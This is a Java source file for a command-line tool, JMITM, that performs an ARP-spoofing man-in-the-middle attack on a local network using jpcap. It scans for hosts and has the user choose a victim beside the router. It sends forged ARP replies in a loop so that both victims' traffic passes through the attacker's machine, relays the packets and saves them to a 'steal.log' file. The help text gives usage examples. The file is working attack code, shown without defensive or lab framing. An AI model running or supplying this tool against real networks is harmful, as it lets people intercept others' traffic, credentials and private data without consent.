import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.HashMap;
import jpcap.JpcapCaptor;
import jpcap.JpcapWriter;
//import java.lang.UnsupportedOperationException;

import jpcap.NetworkInterfaceAddress;
import jpcap.PacketReceiver;

import jpcap.packet.EthernetPacket;
import jpcap.packet.Packet;
import jpcap.packet.ARPPacket;
//import jpcap.packet.TCPPacket;
//import jpcap.packet.UDPPacket;
import jpcap.packet.IPPacket;
import jpcap.NetworkInterface;

public class JMITM {
	private static HashMap<String, String> ip_mac_list;
	private static NetworkInterface device;
	public static ArrayList<String> ips_to_explore;
	//used to filter packets for and from the attacker
	public static String localIp;
	//victim A it's the router
	private static String victimAip;
	//victim B a random host from the lan network
	private static String victimBip;
	private listener traffic_listener;
	private sender middle_sender;
	public sender traffic_sender;
	private PacketReceiver middle_handler;
	private JpcapCaptor captor;
	private static JpcapWriter writer;
	private String output;
	
	private NetworkInterfaceAddress __get_inet4(NetworkInterface device) throws NullPointerException {
		if (device == null) throw new NullPointerException("No device has been given! potato");

		for(NetworkInterfaceAddress addr : device.addresses)
			if(addr.address instanceof Inet4Address)
				return addr;

		return null;
	}

	public JMITM(NetworkInterface mydevice, String defaultoutput) {
		this.middle_handler = new middle_handler();
		device = mydevice;
		ip_mac_list = new HashMap<String, String>();
		ips_to_explore = new ArrayList<String>();
		
		localIp =  __get_inet4(device).address.toString().split("/")[1];
		
		try {
			this.traffic_listener = new listener(device, this.middle_handler);
			//this.traffic_listener.setFilter("udp", true);
		} catch (IOException e) {
			e.printStackTrace();
		}

		if (defaultoutput == null){
			this.output = "steal.log";
		}
		else{
			this.output = defaultoutput;
		}
		
		try {
			this.middle_sender = new sender(device);
			this.traffic_sender = new sender(device);
			this.captor=JpcapCaptor.openDevice(device, 65535, false, 20);
			//open a file to save captured packets
			writer=JpcapWriter.openDumpFile(captor,this.output);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private static byte[] calculate_mac(String mac) {
		String[] macAddressParts = mac.split(":");
		
		// convert hex string to byte values
		byte[] macAddressBytes = new byte[6];
		for(int i=0; i<6; i++){
		    Integer hex = Integer.parseInt(macAddressParts[i], 16);
		    macAddressBytes[i] = hex.byteValue();
		}
		
		return macAddressBytes;
	}
	
	private static String decalculate_mac(byte[] mac){
		StringBuilder sb = new StringBuilder(18);
	    for (byte b : mac) {
	        if (sb.length() > 0)
	            sb.append(':');
	        sb.append(String.format("%02x", b));
	    }
	    return sb.toString();
	}
	
	public void dump() {
		hostdiscover hosty = new hostdiscover(device, ips_to_explore);
		hosty.discover();
		//String gatewayip = hosty.getGatewayIp();
		ip_mac_list.putAll(hosty.getHosts());
		
		//for the moment the victimA always will be the router
		victimAip = hosty.getGatewayIp();
		
		/* will ~pretty~ print here the hosts(victims) to choose 
		 * between who you want to listen to  */
		System.out.println("Online hosts(victims):");
		ArrayList<String> online_ips = new ArrayList<String>(ip_mac_list.keySet());
		for(int i=0; i<online_ips.size();i++){
			String current_ip = online_ips.get(i);
			if (!current_ip.equals(victimAip))
				System.out.println(i+". "+current_ip);
		}
		
		/* choose two victim via index */
		BufferedReader in = new BufferedReader(new InputStreamReader(System.in));
		String victimB = null;
		try {
			System.out.println();
			System.out.print("Choose victim(index):");
			victimB = in.readLine();
		} catch (IOException e) {
			System.out.println(e.getMessage());
		}
		
		victimBip = online_ips.get(Integer.parseInt(victimB));
		
		System.out.println("Victim A, ip: "+victimAip+", mac: "+ip_mac_list.get(victimAip));
		System.out.println("Victim B, ip: "+victimBip+", mac: "+ip_mac_list.get(victimBip));
		
		//this.traffic_listener.setFilter("tcp and udp",true);
		this.traffic_listener.start();
		
		arp fakeA = new arp(null);
		arp fakeB = new arp(null);
		arp fakeme = new arp(null);
		
		try {
			/*byte[] fake_mac = new byte[] { (byte)Integer.parseInt("0",16),  (byte)Integer.parseInt("24",16),
	                (byte)Integer.parseInt("2b",16), (byte)Integer.parseInt("68",16),(byte)Integer.parseInt("4c",16),
	                (byte)Integer.parseInt("1b",16) };
	         */
			
			fakeme.buildDevice("fakyo", "ihniwidyo", "fakyo", "fakeyo", calculate_mac( ip_mac_list.get(victimBip)),
					localIp, this.__get_inet4(device).subnet.toString().split("/")[1]);
			/* now we will create two fake devices to arp poison the to victims 
			 * giving them my mac address so their traffic will come to me 
			 * */
			
			fakeA.buildDevice("fak0", "ihniwid", "fak0", "fake", device.mac_address,
					victimAip, this.__get_inet4(device).subnet.toString().split("/")[1]);
			fakeB.buildDevice("fak1", "ihniwid1", "fak1", "fake1", device.mac_address,
					victimBip, this.__get_inet4(device).subnet.toString().split("/")[1]);
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		System.out.println("Start spoofing victims.");
		while(true){
			try {
				//spoof the two victims my mac address(provide a fake one)
				//check again may it is not needed
				this.middle_sender.send(fakeme.build_reply_packet(victimAip, ip_mac_list.get(victimAip),
							device.mac_address));
				this.middle_sender.send(fakeme.build_reply_packet(victimBip, ip_mac_list.get(victimBip),
						device.mac_address));
				
				/*and now A spoofs B and B spoofs A */
				this.middle_sender.send(fakeA.build_reply_packet(victimBip, ip_mac_list.get(victimBip),
						device.mac_address));
				this.middle_sender.send(fakeB.build_reply_packet(victimAip, ip_mac_list.get(victimAip),
						device.mac_address));
				//sleep a little
				//Thread.currentThread();
				Thread.sleep(100);

			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
	
	class middle_handler implements PacketReceiver {
		private String dst_ip;
		private String src_ip;
		
		@Override
		public void receivePacket(Packet p_temp){
			
			if (p_temp instanceof ARPPacket) return;
			
			EthernetPacket p_eth =(EthernetPacket)p_temp.datalink;
			
			//check if the packet is mine just return do not send it again
			String mine_mac = decalculate_mac(device.mac_address);
			String incoming_src_mac = decalculate_mac(p_eth.src_mac);
			
			if (mine_mac.equals(incoming_src_mac)) return;
			
			IPPacket p = ((IPPacket) p_temp);
			this.dst_ip = p.dst_ip.toString().split("/")[1];
			this.src_ip = p.src_ip.toString().split("/")[1];
			System.out.println("Packet captured, source: "+this.src_ip+" destination: "+this.dst_ip);
			
			//ignore attacker's packets
			if(this.dst_ip.equals(localIp) || 
					this.src_ip.toString().equals(localIp)) return;
						
			if (this.dst_ip.equals(victimBip)){
				traffic_sender.send(spoofPacket(p_temp, victimBip));
			}
			else if(this.src_ip.equals(victimBip)){
				traffic_sender.send(spoofPacket(p_temp, victimAip));
			}
			
			//save the packets into a file
			writer.writePacket(p_temp);
			
			return;
		}
		
		private Packet spoofPacket(Packet p, String victim){
			EthernetPacket p_eth =(EthernetPacket)p.datalink;
			EthernetPacket ether=new EthernetPacket();
			ether.frametype=p_eth.frametype;
			ether.src_mac= device.mac_address;//p_eth.src_mac;
			//only difference now is that for dst mac now is the official
			ether.dst_mac=  calculate_mac(ip_mac_list.get(victim));
			
			p.datalink = ether;
			
			return p;
		}
	}

	public static void setIpsToExplore(String ips_temp){
		if (ips_temp == null) return;
		String[] ips = ips_temp.split(",");
		for(int i = 0; i < ips.length; i++){
			try {
				InetAddress.getByName(ips[i]);
				ips_to_explore.add(ips[i]);
			} catch (Exception e) {
				System.out.println("WARNING: "+ips[i]+" is not a valid ip address");
				//e.printStackTrace();
			}
		}
	}
	
	public static void main(String[] args) {
		String helptext = "\nUsage of JMITM\n\tArguments:\n\t-h, --help\n\t\tPrint the helptext of the JMITM"+
				"\n\t-i, --interface INTERFACE\n\t\tThe network interface which will be used to perform the MITM attack\n\t\tIf none(or invalid) interface is provided then"+
				" a menu with the available \n\t\tnetwork interfaces is printed and the user can choose from there"+
				"\n\t-t, --targets TARGETS(comma separated) optional argument\n\t\tBy default the MITM will scan the whole ip range of the network," +
				" \n\t\twith -t argument you can specify which ips(comma separated)\n\t\tyou want to discover and then choose a victim." +
				"\n\t-o, --output OUTPUT(optional)\n\t\tBy default the JMITM will dump all the stolen packets in a file steal.log\n\t\tin the current "+
				"directory. With -o/--output you can override the default one \n\t\tand can choose in which file you want the middle.java to dump/save the stolen packets.\n\n"+
				"\tOnce you execute the JMITM choose which network interface you want to use from the \n\tprinted menu(or provide it as a command line argument) and let the" +
				" middle to do the rest. \n\tAfter the host discovery choose a victim to perform the man in the middle attack."+
				"\n\tExamples of usage:\n\t\tsudo java JMITM -t 192.168.1.1,192.168.1.10,192.168.1.34\n\t\t" +
				"sudo java JMITM --targets 192.168.1.56,192.168.1.73 -i wlan0\n\t\t" +
				"sudo java JMITM --output /home/dummy.log";
		NetworkInterface device = null;
		Boolean arg_error = false;
		String targets = null;
		String myinterface = null;
		String output = null;
		
		//parse the command line arguments
		for(int i = 0; i < args.length; i++){
			if (args[i].equals("-h") || args[i].equals("--help")){
				if (args.length == 1){
					System.out.println(helptext);
					System.exit(0);
				}
				else{
					System.out.println("Wrong combination of arguments , if you want help to br printed out just only provide --help/-h");
					arg_error = true;
				}
			}
			if (args[i].equals("-i") || args[i].equals("--interface")){
				if (i+1 < args.length){
					myinterface = args[i+1];
				}else{
					System.out.println("ERROR: You didn't provide any input after -i/--interface argument!!");
					arg_error = true;
				}
			}
			if (args[i].equals("-t") || args[i].equals("--targets")){
				if(i+1 < args.length){
					targets = args[i+1];
				} else {
					System.out.println("ERROR: You didn't provide any input after -t/--targets argument!!");
					arg_error = true;
				}
			}
			if (args[i].equals("-o") || args[i].equals("--output")){
				if(i+1 < args.length){
					output = args[i+1];
				} else {
					System.out.println("ERROR: You didn't provide any input after -o/--output argument!!");
					arg_error = true;
				}
			}
		}
		//if an error occurred with the argument parsing print the helptext and then exit
		if (arg_error){
			System.out.println(helptext);
			System.exit(1);
		}
		
		//check the given(if any) network interface
		if(myinterface != null){
			device = NIC.getInterfaceByName(myinterface); 
			if (device == null){
				System.out.println("WARNING: You didn't provide a valid network interface with the argument -i/--interface!!\n"
						+"Choose a valid one from the menu below.");
				device = NIC.nic();
				
			}
		}else{
			//get a valid and active network interface
			device = NIC.nic();
		}

		JMITM m = new JMITM(device, output);
		JMITM.setIpsToExplore(targets);
		m.dump();
	}
}
